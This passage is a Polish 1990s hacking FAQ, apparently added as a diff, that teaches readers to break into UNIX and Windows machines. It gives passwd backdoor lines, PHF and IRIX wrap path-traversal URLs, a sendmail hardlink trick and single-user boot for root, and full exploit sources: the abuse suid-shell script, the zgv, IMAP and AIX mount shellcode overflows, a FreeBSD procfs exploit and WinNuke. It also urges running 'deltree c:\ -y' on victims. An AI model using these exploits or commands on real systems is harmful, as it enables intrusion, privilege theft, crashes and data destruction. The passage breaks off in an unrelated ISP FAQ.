+      mozna poprostu komus wyslac msg ze zapraszasz go na  ten
+      kanal albo zeby postapis  bardziej  hurtowo  i  wzbudzic
+      mniej podejrzen napisz na public cos takiego:
+      /action ivites you on channel #5,0
+      wtedy u wszystkich na ekranie pojawi  sie  tekst  bardzo
+      podobny  i  nieodroznialny  dla  lamera  od  prawdziwego
+      invite :-P
+
+  4. Lamanie systemow UNIXowych
+
+   4.1. UNIX - podstway
+
+      UNIX jak chyba kazdy wie jest systemem operacyjnym. Jest
+      uzywany przedewszystkim jako serwer sieci. Jest systemem
+      prostym ale o bardzo duzych  mozliwosciach.  Jest  dosyc
+      podobny do systemu MS-DOS (chociaz ja  uwazam  osobiscie
+      , ze to DOS jest  podobny  do  UNIXa).  Jest  to  system
+      wielodostepny (ma do niego dostep wielu  uzytkownikow  i
+      moga oni kozystac z niego jednoczesnie) i wielozadaniowy
+      (czyli moze wykonywac wiele procesow jednoczesnie)  jest
+      do tego 32 bitowy (i to nie podroba  jak  w Windows 95).
+      Kazdy uzytkownik ktory laczy sie z UNIX-em dostaje swoja
+      konsole  (terminal)  z  ktorej  wydaje  polecenia.  UNIX
+      dzieli zasoby (dyski,pamiec,procesor) na  poszczegolnych
+      uzytkownikow. Uzytkownika  opisuje  jego  nazwa  (login)
+      ktora jest jawna i haslo ktore jest  tajne.  Uzytkownicy
+      sa podzieleni na rozne grupy  dostepy,  ktore  okreslaja
+      ich uprawnienia w systemie. Na szczycie stoji root i  on
+      moze wszystko (prawie) - jest  to  glowny  uzytkownik  w
+      systemie i ma nieograniczone uprawnienia, ale nie przej-
+      moj sie ty bedziesz tez  root-em  jak  opanujesz  sztuke
+      wlamywania sie.
+
+      Podstawowe komendy UNIXa: (w nawiasach odpowiedniki DOS)
+                                 W-windows S-WINDOWS95
+
+      dir/ls    - wyswietla katalog            (dir)
+      cat       - wyswietla zawartosc pliku    (type)
+      telnet    - uruchamia telnet            S(telnet)
+      ftp       - uruchamia program do ftp    S(ftp)
+      id        - identyfikacja uzytkownika
+      finger    - pokazuje uzytkownikow
+      echo      - pisze cos na urzadzeniu      (echo)
+      kill      - zabija proces               S(C+A+del)
+      su        - logowanie jako super-user
+      pico      - prosty edytor                (edit)
+      mc        - rodzaj nakladki na shella    (nc)
+      chown     - zmienia wlasciciela pliku
+      irc       - uruchamia klienta IRC
+      fdisk     - formatuje dyski              (fdisk)
+      adduser   - dodaje uzytkownika
+      rm        - kasuje plik                  (del)
+      cp        - kopioje plik                 (copy)
+      ln        - zwiazuje pliki
+      chfi      - zmienia dane uzytkownika
+      startx    - uruchamia GUI               W(win)
+      mail to:  - wysyla poczte
+
+
+   4.2. Co nam bedzie potrzebne
+
+      Wymienie co trzeba miec na poczatek:
+      WINDOWS: windows 95,telnet,ftp,IE/NS,John the Ripper 1.4
+               ,skanner portow,kilent IRC
+      UNIX   : unix,telnet,ftp,NS/arena,jakis lamacz passwd,
+               skaner portow,IRC
+      w pakiecie windowsa znajdziemy telnet i ftp, a w  UNIXie
+      dostaniemy telnet,ftp,NS/arnena i IRC
+      Jak zgromadzisz te programy to sie nie  napalaj  zbytnio
+      ,bo teraz przychodzi kolej na:
+
+   4.3. Wlamywanie - teoria
+
+      Na poczatek trzeba zalozyc co chcemy  zrobic:  proponuje
+      zdobycie konta z uprawnieniami root-a.  Zeby  to  zrobic
+      musisz sie nieco poduczyc jak dziala UNIX:
+      plik passwd: znajduje sie najczesciej  w  katalogu  /etc
+      zawiera on dane  uzytkownika,  przykladowa  linia  pliku
+      passwd:
+      hellfire:y57Sj.23/nJn7:133:100:Hell Fire:/hellfire:/bin/bash
+      ozancza ona uzytkownika  hellfire  o  zakodowanym  hasle
+      y57Sj.23/nJn7, numer uzytkonika-133 ,  a  grupa  dostepu
+      100, prawdziwe dane to Hell  Fire  :)),  katalog  domowy
+      /hellfire, a shell  znajduje  sie  w /bin/bash.  Czasami
+      zamiast 13 znaczkow kodowanego hasla  znajduje  sie  'x'
+      ,wtedu  hasla   znajduja   sie   w   pliku  /etc/shadow.
+      Pierwsza metoda na wlamanie jest  dopisanie  linijki  do
+      pliku  passwd np.  takiej: hack::0:0:/:/bin/bash.  Wtedy
+      to uzytkownik o nazwie hack dostaje uprawnienia  root-a.
+      Proste nie? Nie! :)) To nie jest takie  proste  zwaszcza
+      kiedy nie masz zadnago konta na serwerze,  ale  wszystko
+      jeszcze przed toba. Mozna tez rozkodowywac  znalezione w
+      pliku passwd hasla przy pomocy programu  John The Ripper
+      , mozna tez  wlamujac  sie  do  duzych  serwerow  szukac
+      lamerii, ktora lubi nazywac swoje konta bardzo  podobnie
+      do loginow lub dodajac na koncu jedynke (to  jak  serwer
+      wymaga zeby podano w hasle jakies cyfry). Po znalezieniu
+      dostepu do jakiegos konta trzeba  pomyslec  o  dopisaniu
+      w.w. linijki, a teraz juz szczegolowo:
+
+   4.4. Jak zdobyc plik passwd?
+
+      Jezeli znamy jakies konto na tym serwerze  wystarczy  do
+      niego wejsc i napisac cat /etc/passwd i mamy plik passwd
+      ,sprawa sie nieco komplikuje jak nie  mamy  tam  zadnego
+      konta.  Wtedy  mozna  zaczac  od  obejrzenia  stron  www
+      serwera, czesto jest tam spis  uzytkownikow  domeny,  na
+      pewno czesc z tych gosci jest lamerami i n.p.  jak  ktos
+      nazywa sie john to haslo ma john1,john,nhoj itp.(chociaz
+      ja lamiac kiedys jeden bardzo duzy serwer po zciagnieciu
+      z niego okolo 250 kont  nie  rozszyfrowalem  zadnego  po
+      mimo uzycia wordlisty 6 Mb a po przerobkach 68 Mb!)  gdy
+      uda ci sie zlamac choc  jedno  zgrywaj  do  siebie  plik
+      passwd i przejdz do nastepnego punktu. Jezeli jednak  ci
+      sie nie  udalo  sproboj  uzyc  nastepujacych  adresow  w
+      przegladarce www - w miejsce www.ofiara.com wpisz  nazwe
+      serwera.
+      http://www.ofiara.com/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd
+      lub
+      http://www.ofiara.com/cgi-bin/php.cgi?/plik/do/przejrzenia
+
+   4.5. Jak zdobyc plik shadow?
+
+      Jezeli po zciagnieciu pliku passwd okazuje ze  hasla  sa
+      shadowane tzn. sa  w pliku  /etc/shadow  to  sprawa  sie
+      lekko komplikuje.  Najpierw  sprawdzamy  metody  ktorymi
+      zdobylismy passwd  (cat,phf,php)  ale  skutecznosc  tych
+      metod siega w porywach 1%.  Mozesz  jeszcze  poszukac  w
+      roznych backup-ach na dysku (ja jak  wlamywalem  sie  do
+      TPSA znalazlem zawartosc wszystkich plikow /etc/ w  kat.
+      /disks/backup/IV1997/d13/all/etc/etc.tar :-) ).  Jak  ci
+      sie uda to do John-a podlacz nie passwd tylko  shadow  i
+      czekaj az cos zlamie.
+
+   4.6. Mam konto... i co?
+
+      Narazie mozesz  sie  zalogowac,  zobaczyc  co  gosc  tam
+      trzyma, poczytac mu poczte, jak serwer jest lamerski,lub
+      zlamales konto jakiegos goscia  z  duzymi  uprawnieniami
+      mozesz sformatowac dyski itp. itd. mozesz  sie  postarac
+      zalozyc sobie konto (komenda  adduser  lub  bezposrednio
+      wpisac sie do pliku passwd).
+
+   4.7. Sendmail
+
+      Sendmail jest to  najpoularniejszy  program  sluzacy  do
+      obslugi poczty pod unixem. Jest on tez jednym z najpopu-
+      larniejszych narzedzi hackerow, z powodu na ilosc bledow
+      ktore posiada. Rozne wersje mozna omijac w rozny  sposob
+      nie bede ich opisywal sam tylko odwolam sie  tu  do  faq
+      p0wera ktory opisal to wszystko dokladnie  w  swoim  faq
+      z jednym wyjatkiem - sendmail 884. Kto chce dostac p0wer
+      faq niech do mnie napisze to ja mu jes wysle.
+
+      4.7.1 Sendmail 884
+
+        Jest to metoda uzyskania root-a z sendmaila 884.Metoda
+        podawana w  innych  faq  nie  dziala  z  powodu  braku
+        mozliwosci zapisu  do  pliku  dead.letter .W  orginale
+        polaczenia miedzy plikami  wygadaly tak:
+
+        passwd -------> dead.letter
+
+        nie mozna czegos takiego zrobic  nie  majac  root-a  w
+        systemie (a jak mamy root-a to po co wtedy to robic):)
+        ale polaczenia zrobic tak:
+
+        passwd -------> jakis.plik <-------dead.letter
+
+        w miejsce jakis.plik podac dowolny plik znajdujacy sie
+        w tym samym filesystemie co dead.letter i passwd.
+        Wszyscy ktorzy beda lamac jakis  884 niech sie do mnie
+        odezwa i opisza czy im sie udalo.
+        W praktyce wyglada to tak:
+        -logujemy sie na konto
+        -robimy I linka (ln /etc/passwd /users/zjs/jakis.plik)
+        -robimy II linka(ln /var/tmp/dead.letter 
+         /users/zjs/jakis.plik)
+        -wysylamy poczte zawierajaca linije  do  wstawienia  w
+         passwd na nieistniejacy adres
+        -logujemy sie komenda su albo sulogin
+
+   4.8. Exploity
+
+       4.8. Exploity
+
+      Exploit jest to program wykorzystujacy dziury w systemie
+      operacyjnym, ktory moze dac nam  konto  root-a,  pokazac
+      jakis plik i zrobic wiele innych pomocnych rzeczy. W 80%
+      przypadkow uruchamia sie go komenda dcc plik.c, a  potem
+      uruchamia sie ./plik
+      Przyznaje sie bez bicia ze wiekszosc exploitow  pochodzi
+      z innych faq.
+
+      4.8.1. Debian 1.1
+
+       Zostala duza dziora w emulatorze  dosa,  zeby  obejrzec
+       kazdy  plik  napisz  "dos -F /plik/do.obejrzenia",  ale
+       niestety wiekszosc adminow skasowala juz emulator dosa.
+       Na czesci systemow zamiast "dos" trzeba wpisac "dosemu"
+
+      4.8.2. Red Hat 2.1
+
+       4.8.2.1. dum bug
+
+        "/sbin/dump 0uf woot.dump /etc/shadow" zasada  dziala-
+        nia jak w 2.8.1.
+
+       4.8.2.2. abuse
+
+        Ten exploit wykozystuje atrybut s+ pliku abuse.console
+        , czasami gra  jest  w  innym  katalogu  wtedy  trzeba
+        zmienic go w programie
+
+-- CUT HERE --
+#!/bin/sh
+if test -u /usr/lib/games/abuse/abuse.console
+then
+echo System seems to be vunerable...
+cd /tmp
+cat << _EOF_ > /tmp/undrv
+#!/bin/sh
+/bin/cp /bin/sh /tmp/abuser
+/bin/chmod 4777 /tmp/abuser
+_EOF_
+chmod +x /tmp/undrv
+PATH=/tmp
+echo Executing Abuse...
+/usr/lib/games/abuse/abuse.console
+/bin/rm /tmp/undrv
+if test -u /tmp/abuser
+then
+echo Exploit successful, suid shell located in /tmp/abuser
+else
+echo Exploit failed.
+fi
+else
+echo Machine isn't vunerable.
+fi
+-- CUT HERE --
+
+       4.8.2.3. rootshell
+
+        Nie mam inforamcji o narazonych  systemach,  ale  moze
+        dzialac na dosyc nowych redhat (powstal 5.1997).
+        Zaklada na shella z uprawnieniami root-a :)
+        Uzycie:
+        $ cp zgv_exploit.c n.c
+        $ cc -o n n.c
+        $ ./n
+        Oak driver: Unknown chipset (id =  0)
+        bash#
+
+-- CUT HERE --
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+char *shellcode =
+  "\x31\xc0\xb0\x31\xcd\x80\x93\x31\xc0\xb0\x17\xcd\x80\x68\x59\x58\xff\xe1"
+  "\xff\xd4\x31\xc0\x99\x89\xcf\xb0\x2e\x40\xae\x75\xfd\x89\x39\x89\x51\x04"
+  "\x89\xfb\x40\xae\x75\xfd\x88\x57\xff\xb0\x0b\xcd\x80\x31\xc0\x40\x31\xdb"
+  "\xcd\x80/"
+  "/bin/sh"
+  "0";
+
+char *get_sp() {
+   asm("movl %esp,%eax");
+}
+
+#define bufsize 4096
+char buffer[bufsize];
+
+main() {
+  int i;
+
+  for (i = 0; i < bufsize - 4; i += 4)
+    *(char **)&buffer[i] = get_sp() -4675;
+
+  memset(buffer, 0x90, 512);
+  memcpy(&buffer[512], shellcode, strlen(shellcode));
+
+  buffer[bufsize - 1] = 0;
+
+  setenv("HOME", buffer, 1);
+
+  execl("/usr/bin/zgv", "/usr/bin/zgv", NULL);
+}
+
+-- CUT HERE --
+
+   4.8.3. Single
+
+      Dziala na 100% linuxow i mysle ze tez na  duzo  unix-ow.
+      Ta metoda na wlamanie jest nieco  inna  od  reszty.  Nie
+      pozwala bowiem na wlamanie z sieci ( w kazdym  razie  mi
+      sie to jeszcze nie udalo ), tylko trzeba  siedziec  przy
+      klawiaturze komputera do ktorego sie  wlamujemy.  Polega 
+      ona  na  uruchomienie   komputera   w   trybie   jednego
+      uzytkownika ( root-a ).
+      1) ogladamy plik /etc/lilo.conf. Przed  pierwszym  image
+         moze  byc linjka "password='haslo'" Trzeba  to  haslo
+         zapamietac przyda  sie potem.
+      2) sprawdzamy zdobyte haslo logujac sie jako root ( jest
+         szansa  ze jest takie samo! )
+      3) resetujemy komputer (  dobrze  jest  starac  sie  nie
+         dopuscic   do   uruchomienia   BIOS-owej    procedury
+         sprawdzania hasla!!! )
+      4a) w LiLo Boot podajemy:
+          LILO bot: linux single
+      4b) w loadlin piszemy:
+          loadlin init single
+      5) jestesmy root-em! 
+      6) tu robimy co  kto  uwaza  (  atrybut  s+  dla  chmod,  
+         dodajemy swojego uzytkownika itp... )
+      7) znowu resetujemy
+
+      Metoda ta ma tylko jedna wade  -  trzeba  siedziec  przy
+      klawiaturze komputera ofiary - chociaz moze ktos wymysli
+      metode zrobienia  tego zdalnie?
+
+   4.8.4. FreeBSD 2.2.1
+      Jest duzy blad w FreeBSD 2.2.1 ( prawdopodobnie bedzie tez dzial pod 3.x)
+
+--CUT HERE--
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <string.h>
+
+u_char search_code[13] = {
+0x8d, 0x05, 0x17, 0x00, 0x00, 0x00,           /* leal 0x17, %eax */
+0x9a, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00};    /* lcall 7,0 */
+
+/* just do a xor %eax, %eax and then a ret */
+u_char new_code[] = {
+0x31, 0xc0, 0xc3};
+
+main(int argc, char **argv)
+{
+        int pid;
+        int fd;
+        char buff[40];
+        char *user;
+
+        /* might need to tweak these */
+        u_int offset=0x8003000;
+        u_int offset_end = 0x8099000;
+
+        if(argc < 2)
+        {
+                fprintf(stderr, "%s user\n", argv[0]);
+                exit(1);
+        }
+        printf("Demonstration of 4.4BSD procfs hole\n");
+        printf("Brian Mitchell <brian@firehouse.net>\n\n");
+        printf("after you see \"setuid changed\", enter the pw for the user\n");
+        printf("\aBe warned, searching for the setuid() function takes a long time!\n");
+        user=argv[1];
+        pid = fork();
+        switch(pid)
+        {
+                case -1:
+                        perror("fork");
+                        exit(1);
+                case 0:
+                        /* give parent time to open /proc/pid/mem */
+                        sleep(3);
+                        execl("/usr/bin/su", "su", user, NULL);
+                        exit(0);
+                default:
+                        sprintf(buff, "/proc/%d/mem", pid);
+                        fd = open(buff, O_RDWR);
+                        if(fd < 0)
+                        {
+                                perror("open procmem");
+                                wait(NULL);
+                                exit(1);
+                        }
+                        /* wait for child to execute suid program */
+                        sleep(6);
+                        /* stop the child */
+                        kill(pid, 17);
+                        printf("searching - please be patient...\n");
+                        /* search for the setuid code */
+                        while(offset != offset_end)
+                        {
+                                lseek(fd, offset, SEEK_SET);
+                                read(fd, buff, 13);
+                                if(!bcmp(buff, search_code, 13))
+                                {
+                                        lseek(fd, offset, SEEK_SET);
+                                        write(fd, new_code, 3);
+                                        printf("setuid changed (0x%x)\n", offset);
+                                        /* sigcont child */
+                                        kill(pid, 19);
+                                        wait(NULL);
+                                        exit(0);
+                                }
+                                offset++;
+                        }
+                        printf("setuid not found!!\n");
+                        kill(pid, 9);
+                        wait(NULL);
+                        exit(1);
+        }
+}
+
+--CUT HERE--
+
+   4.8.5. Linux-y
+
+    Ten exploit dodaje linijke root::0:0:r00t:/:/bin/bashx  na
+    pocztek pliku  passwd.  (shella  mozna  sobie  zmienic  na
+    dowolnie innego).  Wedlug  autora  pracuje  na  wszystkich
+    LINUX-ah ale ja w to nie wierze.
+
+--CUT HERE--
+#include <string.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <stdio.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+
+char *h_to_ip(char *hostname);
+
+char *h_to_ip(char *hostname) {
+
+  struct hostent *h;
+  struct sockaddr_in tmp;
+  struct in_addr in;
+
+  h = gethostbyname(hostname);
+
+  if (h==NULL) { perror("Resolving the host. \n"); exit(-1); }
+
+  memcpy((caddr_t)&tmp.sin_addr.s_addr, h->h_addr, h->h_length);
+  memcpy(&in,&tmp.sin_addr.s_addr,4);
+
+return(inet_ntoa(in));
+}
+
+void banner(void) {
+  system("clear");
+  printf("\nIMAP Exploit for Linux.\n");
+  printf("\n\tAuthor: Akylonius (aky@galeb.etf.bg.ac.yu)\n");
+  printf(" Modifications: p1 (p1@el8.org)\n");
+}
+
+main(int argc, char **argv) {
+
+  int fd;
+  struct sockaddr_in sckdaddr;
+  char *hostname;
+  char buf[4092];
+  int i=8;
+  char realegg[] =
+    "\xeb\x58\x5e"
+    "\x31\xdb\x83\xc3\x08\x83\xc3\x02\x88\x5e\x26"
+    "\x31\xdb\x83\xc3\x23\x83\xc3\x23\x88\x5e\xa8"
+    "\x31\xdb\x83\xc3\x26\x83\xc3\x30\x88\x5e\xc2"
+    "\x31\xc0\x88\x46\x0b\x89\xf3\x83\xc0\x05\x31"
+    "\xc9\x83\xc1\x01\x31\xd2\xcd\x80\x89\xc3\x31"
+    "\xc0\x83\xc0\x04\x31\xd2\x88\x56\x27\x89\xf1"
+    "\x83\xc1\x0c\x83\xc2\x1b\xcd\x80\x31\xc0\x83"
+    "\xc0\x06\xcd\x80\x31\xc0\x83\xc0\x01\xcd\x80"
+    "iamaselfmodifyingmonsteryeahiam\xe8\x83\xff\xff\xff"
+    "/etc/passwdxroot::0:0:r00t:/:/bin/bashx";
+  char *point = realegg;
+  buf[0]='*';
+  buf[1]=' ';
+  buf[2]='l';
+  buf[3]='o';
+  buf[4]='g';
+  buf[5]='i';
+  buf[6]='n';
+  buf[7]=' ';
+
+  banner();
+
+  if (argc<2)  {
+     printf("\nUsage: %s <hostname>\n\n", argv[0]);
+     exit(-1);
+  }
+
+  hostname=argv[1];
+
+  while(i<1034-sizeof(realegg) -1) /* -sizeof(realegg)+1) */
+    buf[i++]=0x90;
+
+  while(*point)
+    buf[i++]=*(point++);
+
+  buf[i++]=0x83; /* ebp */
+  buf[i++]=0xf3;
+  buf[i++]=0xff;
+  buf[i++]=0xbf;
+  buf[i++]=0x88; /* ret adr */
+  buf[i++]=0xf8;
+  buf[i++]=0xff;
+  buf[i++]=0xbf;
+
+  buf[i++]=' ';
+  buf[i++]='b';
+  buf[i++]='a';
+  buf[i++]='h';
+  buf[i++]='\n';
+
+  buf[i++]=0x0;
+
+
+  if ((fd=socket(AF_INET,SOCK_STREAM,0))<0) perror("Error opening the
+socket. \n");
+
+  sckdaddr.sin_port=htons(143);
+  sckdaddr.sin_family=AF_INET;
+  sckdaddr.sin_addr.s_addr=inet_addr(h_to_ip(hostname));
+
+  if (connect(fd,(struct sockaddr *) &sckdaddr, sizeof(sckdaddr)) < 0)
+perror("Error with connecting. \n");
+
+  printf("hmm: \n");
+  getchar();
+  write(fd,buf,strlen(buf)+1);
+  printf("hmm: \n");
+  close(fd);
+}
+
+--CUT HERE--
+
+   4.8.6. HTTP/1.0 Server
+
+    Wykozystuje dziure w skrypcie WRAP  dostarczanym  razem  z
+    systemem IRIX 6.2. Zastosowanie jest proste:
+
+    http://sgi.victim/cgi-bin/wrap?/../../../../../etc
+
+   4.8.7. AIX 4.1/4.2
+
+    Wykozystuje bug-a w programie mount. Kompilacja cc -g test2.c
+    Jezeli podczas uruchamiania dostaniesz komunikat: 
+    Memory Fault albo Illegal Instruction uzyj tego shella:
+
+--CUT HERE--
+#!/bin/ksh
+L=3000
+STEP=34
+MAX=16000
+while [ $L -lt $MAX ]
+do
+./a.out $L
+L=`expr $L + $STEP`
+done
+*/
+--CUT HERE--
+
+
+--CUT HERE--
+test2.c
+22-Mar-97
+*/
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+
+char prog[100]="/usr/sbin/mount";
+char prog2[30]="mount";
+extern int execv();
+
+char *createvar(char *name,char *value)
+{
+char *c;
+int l;
+l=strlen(name)+strlen(value)+4;
+if (! (c=malloc(l))) {perror("error allocating");exit(2);};
+strcpy(c,name);
+strcat(c,"=");
+strcat(c,value);
+putenv(c);
+return c;
+}
+
+/*The program*/
+main(int argc,char **argv,char **env)
+{
+/*The code*/
+unsigned int code[]={
+0x7c0802a6 , 0x9421fbb0 , 0x90010458 , 0x3c60f019 ,
+0x60632c48 , 0x90610440 , 0x3c60d002 , 0x60634c0c ,
+0x90610444 , 0x3c602f62 , 0x6063696e , 0x90610438 ,
+0x3c602f73 , 0x60636801 , 0x3863ffff , 0x9061043c ,
+0x30610438 , 0x7c842278 , 0x80410440 , 0x80010444 ,
+0x7c0903a6 , 0x4e800420, 0x0
+};
+/* disassembly
+7c0802a6        mfspr   r0,LR
+9421fbb0        stu     SP,-1104(SP) --get stack
+90010458        st      r0,1112(SP)
+3c60f019        cau     r3,r0,0xf019 --CTR
+60632c48        lis     r3,r3,11336  --CTR
+90610440        st      r3,1088(SP)
+3c60d002        cau     r3,r0,0xd002 --TOC
+60634c0c        lis     r3,r3,19468  --TOC
+90610444        st      r3,1092(SP)
+3c602f62        cau     r3,r0,0x2f62 --'/bin/sh\x01'
+6063696e        lis     r3,r3,26990
+90610438        st      r3,1080(SP)
+3c602f73        cau     r3,r0,0x2f73
+60636801        lis     r3,r3,26625
+3863ffff        addi    r3,r3,-1
+9061043c        st      r3,1084(SP) --terminate with 0
+30610438        lis     r3,SP,1080
+7c842278        xor     r4,r4,r4    --argv=NULL
+80410440        lwz     RTOC,1088(SP)
+80010444        lwz     r0,1092(SP) --jump
+7c0903a6        mtspr   CTR,r0
+4e800420        bctr              --jump
+*/
+
+#define MAXBUF 600
+unsigned int buf[MAXBUF];
+unsigned int frame[MAXBUF];
+unsigned int i,nop,mn;
+int max;
+int QUIET=0;
+int dobuf=0;
+char VAR[30]="LC_MESSAGES";
+unsigned int toc;
+unsigned int eco;
+unsigned int *pt;
+char *t;
+int egg=1;
+int ch;
+unsigned int reta; /* return address */
+int corr=4604;
+char *args[4];
+char *newenv[8];
+int justframes=1;
+int startwith=0;
+
+mn=78;
+max=100;
+
+if (argc>1)
+        corr = atoi(argv[1]);
+
+pt=(unsigned *) &execv;
+toc=*(pt+1);
+eco=*pt;
+
+if ( ((mn+strlen((char*)&code)/4)>max) || (max>MAXBUF) )
+{
+        perror("Bad parameters");
+        exit(1);
+}
+
+#define OO 7
+*((unsigned short *)code + OO + 2)=(unsigned short) (toc & 0x0000ffff);
+*((unsigned short *)code + OO)=(unsigned short) ((toc >> 16) &
+0x0000ffff);
+*((unsigned short *)code + OO + 8 )=(unsigned short) (eco & 0x0000ffff);
+*((unsigned short *)code + OO + 6 )=(unsigned short) ((eco >> 16) &
+0x0000ffff);
+
+reta=startwith ? (unsigned) &buf[mn]+corr : (unsigned)&buf[0]+corr;
+
+for(nop=0;nop<mn;nop++)
+ buf[nop]=startwith ? reta : 0x4ffffb82;        /*NOP*/
+strcpy((char*)&buf[nop],(char*)&code);
+i=nop+strlen( (char*) &code)/4-1;
+
+if( !(reta & 0xff) || !(reta && 0xff00) || !(reta && 0xff0000)
+        || !(reta && 0xff000000))
+{
+perror("Return address has zero");exit(5);
+}
+
+while(i++<max)
+ buf[i]=reta;
+buf[i]=0;
+
+for(i=0;i<max-1;i++)
+ frame[i]=reta;
+frame[i]=0;
+
+if(QUIET) {puts((char*)&buf);fflush(stdout);exit(0);};
+
+puts("Start...");/*Here we go*/
+
+newenv[0]=createvar("EGGSHEL",(char*)&buf[0]);
+newenv[1]=createvar("EGGSHE2",(char*)&buf[0]);
+newenv[2]=createvar("EGGSHE3",(char*)&buf[0]);
+newenv[3]=createvar("EGGSHE4",(char*)&buf[0]);
+newenv[4]=createvar("DISPLAY",getenv("DISPLAY"));
+newenv[5]=VAR[0] ? createvar(VAR,justframes ? (char*)&frame :
+(char*)&buf):NULL;
+newenv[6]=NULL;
+
+args[0]=prog2;
+execve(prog,args,newenv);
+perror("Error executing execve \n");
+}
+
+/* 
+
+--CUT HERE--
+
+   4.8.8. Windows 95/NT
+
+    Jest tu tekst zrodlowy slawnego WinNuka. Jest  to  program
+    atakujacy port [139] NetBios i powodujacy ze Windows  robi
+    to co umie najlepiej - zawiesza sie.
+
+-- CUT HERE --
+
+/* winnuke.c - (05/07/97)  By _eci  */
+/* Tested on Linux 2.0.30, SunOS 5.5.1, and BSDI 2.1 */
+
+
+#include <stdio.h>
+#include <string.h>
+#include <netdb.h>
+#include <netinet/in.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <unistd.h>
+
+#define dport 139  /* Attack port: 139 is what we want */
+
+int x, s;
+char *str = "Bye";  /* Makes no diff */
+struct sockaddr_in addr, spoofedaddr;
+struct hostent *host;
+
+
+int open_sock(int sock, char *server, int port) {
+     struct sockaddr_in blah;
+     struct hostent *he;
+     bzero((char *)&blah,sizeof(blah));
+     blah.sin_family=AF_INET;
+     blah.sin_addr.s_addr=inet_addr(server);
+     blah.sin_port=htons(port);
+
+
+    if ((he = gethostbyname(server)) != NULL) {
+        bcopy(he->h_addr, (char *)&blah.sin_addr, he->h_length);
+    }
+    else {
+         if ((blah.sin_addr.s_addr = inet_addr(server)) < 0) {
+           perror("gethostbyname()");
+           return(-3);
+         }
+    }
+
+        if (connect(sock,(struct sockaddr *)&blah,16)==-1) {
+             perror("connect()");
+             close(sock);
+             return(-4);
+        }
+        printf("Connected to [%s:%d].\n",server,port);
+        return;
+}
+
+
+void main(int argc, char *argv[]) {
+
+     if (argc != 2) {
+       printf("Usage: %s <target>\n",argv[0]);
+       exit(0);
+     }
+
+     if ((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
+        perror("socket()");
+        exit(-1);
+     }
+
+     open_sock(s,argv[1],dport);
+
+
+     printf("Sending crash... ");
+       send(s,str,strlen(str),MSG_OOB);
+       usleep(100000);
+     printf("Done!\n");
+     close(s);
+}
+
+-- CUT HERE --
+
+   4.8.9. SunOs 4.1.1 Sparc 20
+
+    Zeby  spowodowac   'system panic'   wystarczy   przeczytac
+    /dev/tcx0, czyli po prostu: cat /dev/tcx0
+
+   4.8.10. tin/rin
+
+    Prosty blad w NEWS readerze. Podczas uruchamiania programu
+    tworzona jest w pliku /tpm/.tin_log lista  uzytkownikow  z
+    atrybutem 666. Wystarczy wiec link  lub  symlink  do  tego
+    pliku z passwd (lub innego pliku do  ktorego  chcemy  miec
+    dostep) i gdy uzytkownik z UID=0 (root) uruchomii  tin/rin
+    atrybut 666 zostanie przeniesiony na plik passwd :))
+
+
+  5. The Microsoft Windows 95
+
+   5.1. Kilka slow o Bilu Gates-ie i jego windowsie
+
+      Na poczatek umowmy  sie  ze  bede  moj  ukochany  system
+      operacyjny nazywal shit95 :-)
+      Kiedys mialem chyba z jakiegos Bajtka albo Komputera  10
+      punktow jak poznac zle zrobiony program -  shit  spelnil
+      chyba 7 czy 8 :). Wszyscy chyba wiedza, ze jest to chyba
+      najbadziewniejszy program jaki jest. Jest to  dowod,  ze
+      mozna ludzia wcisnac  niewiadomo  jakie  gowno  byle  je
+      dobrze zareklamowac. Wedlug mnie shit jest to  nawiekszy
+      i  niewykrywalny  przez  zaden   program   antywirusowy,
+      najbardziej rozpowszechniony WIRUS swiata! I jeszcze  sa
+      tacy ktorzy placa microsoftowi za to zeby go sobie zain-
+      stalowac! :-----)
+      Dla rownowagi wymienie kilka jego  zalet:  nie  powoduje
+      uzaleznien od komputera bo  po  10  minutach  pracy  sie
+      zawiesza i raczej zraza ludzi do komputera niz uzaleznia
+      Ma  sztuczna  inteligencje  -  czasami  sam   przestanie
+      dzialac, skasuje kilka plikow, zainstaluje program ktory
+      jest ci niepotrzebny. I kilka jeszcze innych... :-)
+      Teraz zajme sie Bilem Gates-em - powiem krotko, jak  sie
+      kiedys pojawi kolo mnie to posadze palanta przed monito-
+      rem i kaze pisac nowy system... :)
+      UWAGA!!! Teraz bedzie  moje  nowe  haslo  reklamowe  dla
+      ukochanego systemu:
+                         SHIT to GOWNO!
+
+   5.2. Jak zabic windowsa?
+
+      Jezeli spodkamy kogos z windowsem  na  IRC  wysylamy  mu
+      winnuka, a jezeli gosc ma patha  to  zaczynamy  dobierac
+      sie do niego portscanem - 90% ze  sie  zawiesi.  Sa  tez
+      podobno programy do uruchamiania zdalnie komend windowsa
+      takich jak "deltree c:\ -y" co spowoduje  skasowanie  mu
+      wszystkich plikow z dysku bez pytania. :)
+
+   5.3. WWWWW - Windows W World Wide Web
+
+      Ten rozdzial tez jest dokladnie opisany w p0wer faq,  ja
+      tylko dodam od siebie ze zamiast kalkulatora mozna  uzyc
+      komendy "deltree c:\ -y"
+
+
+   5.5. Internet Provider
+                             Inet Provi FAQ
+
+			    written by nEmEs	
+
+
+	Moze nie wszyscy wiedza, ale jestem wspol Internet Providerem i chcialbym
+przyblizyæ wam ten zawod, wbew pozorom trudny - DUZA Konkurencja !!!! Polbox i Onet SUX !
+
+
+	1. Poczatki !
+	 1.1 Wstep.
+	 1.2 Podania do bardzo waznych instytucji panstwowych.
+	 1.3 Co robic w czasie oczekiwania na zestawienie polaczenia.
+	 
+	2. Sprzet.
+	 2.1 Serwer.
+	 2.2 Stanowisko robocze.
+	 2.3 Router.
+	 2.4 Modemy na lacza dzierzawione o duzej szybkosci.
+
+	3. Co robic jak cie juz podlacza.
+
+	4. Trudne zycie - Hackerzy !!!
+
+	5. Monopolisci
+	 5.1 TP s.a.
+	 5.2 Polpak
+	 5.3 NASK.
+
+	6. Calkowity koszt.
+
+
+
+1. Poczatki !
+
+	1.1 	Zanim pomyslisz: " Chcê byæ Internet Providerem 
